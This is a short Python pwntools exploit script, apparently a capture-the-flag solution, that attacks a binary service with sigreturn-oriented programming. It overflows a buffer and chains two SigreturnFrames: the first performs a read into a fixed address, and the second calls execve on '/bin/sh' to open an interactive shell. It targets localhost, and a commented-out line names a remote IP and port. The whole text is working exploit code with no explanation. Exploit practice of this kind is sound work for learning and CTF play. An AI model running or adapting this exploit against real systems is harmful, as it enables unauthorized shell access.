from pwn import *
context(arch="amd64", os="linux", log_level="debug")
#s=remote("47.97.58.52",42011)
s=remote("localhost",9999)
syscall_ret=0x40100A
pad=(b"a"*15).ljust(0x50,b"\x00")+p64(syscall_ret)
s1=SigreturnFrame()
s1.rax=0
s1.rdi=0
s1.rsi=0x402800
s1.rdx=0x1000
s1.rip=syscall_ret
s1.rsp=0x402800
pad+=bytes(s1)
sleep(1)
s.sendafter(b"Hello> ",pad)
sleep(1)
s.send(p64(0x401021))
sleep(1)
s2=SigreturnFrame()
s2.rax=59
s2.rdi=0x4027c8
s2.rsi=0
s2.rdx=0
s2.rsp=0x402800
s2.rip=syscall_ret
pad2=(b"a"*15+b"\x00"+b"/bin/sh\x00").ljust(0x50,b"\x00")+p64(syscall_ret)+bytes(s2)
s.sendafter(b"Hello> ",pad2)
s.interactive()